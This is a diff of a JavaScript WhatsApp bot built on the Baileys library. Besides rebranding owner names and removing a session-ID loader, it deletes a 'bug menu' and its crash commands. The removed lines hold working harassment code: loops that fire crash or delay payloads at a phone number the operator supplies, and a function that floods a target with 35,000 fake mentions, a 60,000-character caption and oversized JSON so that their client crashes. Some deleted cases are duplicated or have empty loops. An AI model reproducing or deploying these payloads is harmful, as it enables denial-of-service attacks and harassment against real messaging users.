@@ -10,7 +10,7 @@ const jimp = require("jimp")
 const os = require('os')
 const path = require('path')
 const { handleMediaUpload } = require('./lib/catbox')
-const { getDevice, useSingleFileAuthState } = require('@whiskeysockets/baileys')
+const { getDevice } = require('@whiskeysockets/baileys')
 const fsp = fs.promises;
 const lolcatjs = require('lolcatjs')
 const util = require("util")
@@ -18,34 +18,6 @@ const moment = require("moment-timezone")
 const yts = require('yt-search')
 const { spawn, exec, execSync } = require('child_process')
 const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
-
-// ================= SHORT SESSION ID SETUP (NO BASE64) ================= //
-const SESSION_ID = process.env.SESSION_ID || "TREND-XMD~"
-
-let creds
-try {
-    const rawData = SESSION_ID.replace("TREND-XMD~", "")
-    creds = JSON.parse(rawData)   // directly parse JSON string
-    console.log(chalk.green("✅ Short raw Session ID loaded successfully"))
-} catch (e) {
-    console.log(chalk.red("❌ Invalid SESSION_ID. Please generate a new one."))
-    creds = {}
-}
-
-const authState = {
-    creds,
-    keys: {
-        get: async () => ({}),
-        set: async () => {}
-    }
-}
-
-const saveState = async () => {
-    // here you could update SESSION_ID if you want auto-save later
-    console.log(chalk.yellow("⚡ Using Short Raw Session ID (TREND-XMD)"))
-}
-// ====================================================================== //
-
 module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
 try {
 const body = (m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "")
@@ -742,20 +714,13 @@ case 'vinic': {
     header: {
       title: '☘ TREND 𝗧𝗘𝗖𝗛 ☘',
       content: [
-        `👤 ᴏᴡɴᴇʀ: ☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘`,
+        `👤 ᴏᴡɴᴇʀ: ☘ TRENDEX  ☘`,
         `👤 ᴜsᴇʀ: ${pushname || 'Unknown'}`,
-        `🤖 ʙᴏᴛɴᴀᴍᴇ: trend x`,
+        `🤖 ʙᴏᴛɴᴀᴍᴇ: TREND X`,
         `🌍 ᴍᴏᴅᴇ: ${conn.public ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}`,
         `🛠️ ᴘʀᴇғɪx: [ ${prefix} ]`,
         `📈 ᴄᴍᴅs: 100+`, // Replace with actual command count if available
         `🧪 ᴠᴇʀsɪᴏɴ: 1.0.0-beta`,
-      ],
-    },
-    bug: {
-      title: '> 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ',
-      commands: [
-        '𝖨𝗇𝗏𝗂𝗌', '𝖷𝖼𝗋𝖺𝗌𝗁', '𝖢𝗋𝖺𝗌𝗁', '𝖣𝖾𝗅𝖺𝗒',
-        '𝙲𝚛𝚊𝚡', '𝖣𝖾𝗅𝖺𝗒𝖼𝗈𝗆𝖻𝗈', '𝖣𝖺𝗋𝗄', '𝖣𝗂𝗆', 'trend-crash',
       ],
     },
     owner: {
@@ -841,7 +806,7 @@ case 'vinic': {
         externalAdReply: {
           showAdAttribution: true,
           title: global.botname || 'TREND-X',
-          body: '☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘',
+          body: '☘ TRENDEX ☘',
           mediaType: 3,
           renderLargerThumbnail: false,
           thumbnail: cina, // Ensure 'cina' is defined or replace with valid thumbnail
@@ -3740,271 +3705,6 @@ if (!isBotAdmins) return reply(mess.botadmin)
 conn.groupRevokeInvite(from)
 reply("*group link reseted by admin*" )
 }
-//bug command
-break
-case "trial":{
-if(!Access) return reply("*Used by owner only*")
-if(!text) return reply(`Example: ${prefix + command} 25672345...`)
-const target = q.replace(/[^0-9]/g,"") + "@s.whatsapp.net"
-await bugload()
-reply(`TREND-𝙓 𝙨𝙚𝙣𝙙𝙞𝙣𝙜 𝙗𝙪𝙜𝙨 𝙩𝙤 ${target}`)
-//sending bugs
-for(let i = 0; i < 40; i++){
-//loading the bugs using the function
-await Trial(target)
-await Trial(target)
-await Trial(target)
-await sleep(2000) //2minutes pause time
-await Trial(target)
-await Trial(target)
-}
-reply(`𝗦𝘂𝗰𝗰𝗲𝘀𝙨 𝘀𝗲𝗻𝘁 𝗯𝘂𝗴𝘀 𝘁𝗼 ${target}\n Command: ${command}`)
-}
-break
-case "dark":{
-if(!Access) return reply(mess.owner)
-if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*dark* 256689...")
-target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
-await bugLoad()
-
-     conn.sendMessage(m.chat, {  
-            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘TREND 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `120363401765045963@newsletter` 
-                },
-                
-            }
-        },{ quoted: st }
-    )
-for(let i = 0; i < 30; i++){
-await RB(target)
-await RB(target)
-await RB(target)
-await sleep(1500)
-await RB(target)
-await RB(target)
-await sleep(1500)
-await RB(target)
-
-}
-}
-
-break
-case "dark": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*dark* 256689...")
-    
-    // Initialize q properly before using it
-    const q = text.trim()
-    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-    
-    await bugLoad()
-
-    try {
-        // Send initial message
-        await conn.sendMessage(m.chat, {  
-            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘TREND-X 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `120363401765045963@newsletter` 
-                },
-            }
-        }, { quoted: st })
-
-        // Perform the repeated actions
-        for(let i = 0; i < 30; i++) {
-            await RB(target)
-            await RB(target)
-            await RB(target)
-            await sleep(1500)
-            await RB(target)
-            await RB(target)
-            await sleep(1500)
-            await RB(target)
-        }
-    } catch (error) {
-        console.error("Error in dark command:", error)
-        reply("An error occurred while processing the command.")
-    }
-}
-break
-case "delaycombo":{
-if(!Access) return reply(mess.owner)
-if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
-let vc = q.replace(/[^0-9]/g,'')
-const target = vc + "@s.whatsapp.net"
-await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
-await bugLoad ()
-    conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘TREND 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `120363401765045963@newsletter` 
-                },
-                
-            }
-        },{ quoted: st }
-    )
-
-for(let r = 0; r < 40; r++){
-
-}
-}
-break
-case "invis": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
-    let q = text.trim() // Initialize q with the text content
-    let vc = q.replace(/[^0-9]/g,'')
-    const target = vc + "@s.whatsapp.net"
-    await conn.sendMessage(m.chat, {react: {text: '🦅', key: m.key}});
-    await bugLoad()
-    
-    conn.sendMessage(m.chat, {  
-        image: { url: "https://files.catbox.moe/adymbp.jpg" },  
-        caption: buggy,   
-        contextInfo: {
-            mentionedJid: [m.sender],
-            forwardedNewsletterMessageInfo: {
-                newsletterName: "☘TREND-X 𝗧𝗘𝗖𝗛☘",
-                newsletterJid: `120363401765045963@newsletter` 
-            },
-        }
-    }, { quoted: st })
-
-    for(let r = 0; r < 40; r++) {
-        await delayonly(target)
-        await delayonly(target)
-        await delayonly(target)
-        await sleep(2000)
-        await delayonly(target)
-        await delayonly(target)
-        await delayonly(target)
-        await sleep(1500)
-        await delayonly(target)
-        await delayonly(target)
-    }
-}
-break
-case "Vinic-crash": {
-if(!Access) return reply(mess.owner)
-if(!text) return reply(`Example:
-${command} 254xxx`)
-async function newsletterSqL(target, ptcp = true) {
-    
-    const img300 = require('./folder/folder/image.jpg')
-    
-    const mentionedList = [
-    target, ...Array.from({ length: 35000 }, () =>
-      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-      )
-    ];
-    
-    try {
-        const message = {
-            botInvokeMessage: {
-                message: {
-                    newsletterAdminInviteMessage: {
-                        newsletterJid: '120363401765045963@newsletter',
-                        newsletterName: "TREND-X",
-                        jpegThumbnail: img300,
-                        caption: "ꦾ".repeat(60000),
-                        inviteExpiration: Date.now() + 9999999999,
-                    },
-                },
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-            },
-            contextInfo: {
-              remoteJid: target,
-              participant: target,
-              mentionedJid: mentionedList,
-              stanzaId: conn.generateMessageTag(),
-            },
-        };
-
-        await conn.relayMessage(target, message, {
-          userJid: target,
-        });
-    } catch (error) {
-        console.log("error:\n" + error);
-      }
-   }
-}
-break
-case "invis": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
-    let q = text // Initialize 'q' with the input text (minimal change)
-    let vc = q.replace(/[^0-9]/g,'')
-    const target = vc + "@s.whatsapp.net"
-    await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
-    await bugLoad()
-    conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/adymbp.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `` 
-                },
-            }
-        },{ quoted: st }
-    )
-    for(let r = 0; r < 40; r++){
-        await delayonly(target)
-        await delayonly(target)
-        await delayonly(target)
-        await sleep(2000)
-        await delayonly(target)
-        await delayonly(target)
-        await delayonly(target)
-        await sleep(1500)
-        await delayonly(target)
-        await delayonly(target)
-    }
-}
-break
-case "crax":{
-if(!Access) return reply(mess.owner)
-if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xxx`)
-let vc = q.replace(/[^0-9]/g,'')
-const target = vc + "@s.whatsapp.net"
-const ment = false
-await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
-await bugLoad()
-    conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘TREND-X 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `` 
-                },
-                
-            }
-        },{ quoted: st }
-    )
-    
-for(let r = 0; r < 50; r++){
-
-}
-
-}
-
 break
         
 case 'backup':
